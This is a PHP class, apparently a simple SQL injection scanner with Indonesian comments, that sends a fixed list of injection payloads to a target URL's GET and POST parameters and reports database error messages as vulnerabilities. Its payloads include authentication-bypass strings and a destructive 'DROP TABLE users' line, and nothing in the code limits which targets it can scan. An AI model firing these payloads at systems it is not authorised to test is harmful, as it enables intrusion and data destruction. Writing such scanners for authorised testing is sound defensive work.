<?php
/**
 * SQL Injection Tester - Security Operation Center
 * Menguji kerentanan SQL injection pada aplikasi web
 */

class SqlInjector {
    
    private $payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "admin'--",
        "admin' #",
        "' OR 'a'='a",
        "1' OR '1'='1' #"
    ];
    
    public function test($url, $parameters = []) {
        $startTime = microtime(true);
        $results = [
            'url' => $url,
            'scanTime' => 0,
            'status' => 'completed',
            'vulnerabilities' => [],
            'testedPayloads' => 0,
            'riskLevel' => 'Low'
        ];
        
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            $results['status'] = 'error';
            $results['error'] = 'URL tidak valid';
            return $results;
        }
        
        foreach ($this->payloads as $payload) {
            $results['testedPayloads']++;
            
            $testResult = $this->testPayload($url, $payload, $parameters);
            
            if ($testResult['vulnerable']) {
                $results['vulnerabilities'][] = [
                    'payload' => $payload,
                    'method' => $testResult['method'],
                    'parameter' => $testResult['parameter'],
                    'response' => substr($testResult['response'], 0, 200),
                    'evidence' => $testResult['evidence']
                ];
            }
        }
        
        $results['riskLevel'] = $this->calculateRiskLevel($results['vulnerabilities']);
        $results['scanTime'] = round((microtime(true) - $startTime) * 1000, 2);
        
        return $results;
    }
    
    private function testPayload($url, $payload, $parameters) {
        $result = [
            'vulnerable' => false,
            'method' => 'GET',
            'parameter' => '',
            'response' => '',
            'evidence' => ''
        ];
        
        // Test GET parameters
        if (!empty($parameters)) {
            foreach ($parameters as $param => $value) {
                $testUrl = $url . '?' . $param . '=' . urlencode($payload);
                $response = $this->makeRequest($testUrl);
                
                if ($this->detectSqlError($response)) {
                    $result['vulnerable'] = true;
                    $result['parameter'] = $param;
                    $result['response'] = $response;
                    $result['evidence'] = 'SQL error detected in response';
                    break;
                }
            }
        }
        
        // Test POST data
        if (!$result['vulnerable'] && !empty($parameters)) {
            $postData = [];
            foreach ($parameters as $param => $value) {
                $postData[$param] = $payload;
                
                $response = $this->makePostRequest($url, $postData);
                
                if ($this->detectSqlError($response)) {
                    $result['vulnerable'] = true;
                    $result['method'] = 'POST';
                    $result['parameter'] = $param;
                    $result['response'] = $response;
                    $result['evidence'] = 'SQL error detected in POST response';
                    break;
                }
                
                // Reset for next parameter
                $postData[$param] = $value;
            }
        }
        
        return $result;
    }
    
    private function makeRequest($url) {
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 10,
                'user_agent' => 'Mozilla/5.0 (compatible; SQLTester/1.0)'
            ]
        ]);
        
        return @file_get_contents($url, false, $context) ?: '';
    }
    
    private function makePostRequest($url, $data) {
        $postData = http_build_query($data);
        
        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $postData,
                'timeout' => 10,
                'user_agent' => 'Mozilla/5.0 (compatible; SQLTester/1.0)'
            ]
        ]);
        
        return @file_get_contents($url, false, $context) ?: '';
    }
    
    private function detectSqlError($response) {
        $errorPatterns = [
            'mysql_fetch_array',
            'mysql_fetch_assoc',
            'mysql_num_rows',
            'ORA-[0-9]{5}',
            'PostgreSQL.*ERROR',
            'Warning.*mysql_.*',
            'valid MySQL result',
            'MySqlClient\.',
            'SQL syntax.*MySQL',
            'Warning.*\Wmysql_',
            'MySQLSyntaxErrorException',
            'valid PostgreSQL result',
            'Warning.*\Wpg_',
            'valid PostgreSQL result',
            'PostgreSQL query failed',
            'SQLServer JDBC Driver',
            'SqlException',
            'Oracle error',
            'Oracle.*Driver',
            'Microsoft.*ODBC.*Driver',
            'SQLite.*error',
            'sqlite3.OperationalError'
        ];
        
        foreach ($errorPatterns as $pattern) {
            if (preg_match('/' . $pattern . '/i', $response)) {
                return true;
            }
        }
        
        return false;
    }
    
    private function calculateRiskLevel($vulnerabilities) {
        $count = count($vulnerabilities);
        
        if ($count === 0) {
            return 'Low';
        } elseif ($count <= 2) {
            return 'Medium';
        } elseif ($count <= 5) {
            return 'High';
        } else {
            return 'Critical';
        }
    }
}
?>